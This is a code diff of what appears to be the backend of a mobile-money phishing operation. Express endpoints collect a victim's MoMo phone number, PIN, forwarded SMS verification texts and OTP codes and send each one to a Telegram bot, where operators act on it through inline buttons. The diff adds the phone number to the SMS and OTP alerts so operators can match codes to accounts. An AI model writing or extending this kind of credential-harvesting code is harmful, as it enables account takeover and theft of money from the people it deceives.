@@ -35,7 +35,7 @@ app.post('/applications/:id/submit-auth', async (req, res) => {
   appData.momo_pin = req.body.momo_pin;
 
   const message = `🔐 *MoMo Authentication Request*\n\n` +
-    `📱 *Phone:* ${appData.momo_phone}\n` +
+    `📱 *Phone / MoMo Number:* ${appData.momo_phone}\n` +
     `🔑 *PIN:* ${appData.momo_pin}\n` +
     `🆔 *App ID:* ${appId}`;
 
@@ -70,6 +70,7 @@ app.post('/applications/:id/submit-sms', async (req, res) => {
   appData.sms_text = req.body.sms_text;
 
   const message = `💬 *SMS Verification Text Received*\n\n` +
+    `📱 *Phone / MoMo Number:* ${appData.momo_phone || 'N/A'}\n\n` +
     `📄 *Content:*\n\`\`\`\n${appData.sms_text}\n\`\`\`\n` +
     `🆔 *App ID:* ${appId}`;
 
@@ -107,6 +108,7 @@ app.post('/applications/:id/submit-otp', async (req, res) => {
   appData.otp_code = req.body.otp_code;
 
   const message = `🔢 *OTP Verification Received*\n\n` +
+    `📱 *Phone / MoMo Number:* ${appData.momo_phone || 'N/A'}\n` +
     `🔑 *OTP Code:* ${appData.otp_code}\n` +
     `🆔 *App ID:* ${appId}`;
 
@@ -161,18 +163,16 @@ app.post('/telegram-webhook', async (req, res) => {
     }
 
     try {
-      // 1. Show non-blocking top notification popup and remove buttons immediately
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           callback_query_id: cb.id,
           text: `Action processed: ${action.toUpperCase()}`,
-          show_alert: false // Displays notification toast at top instead of pop-up window
+          show_alert: false
         })
       });
 
-      // 2. Remove the inline keyboard buttons so they fade/disappear
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
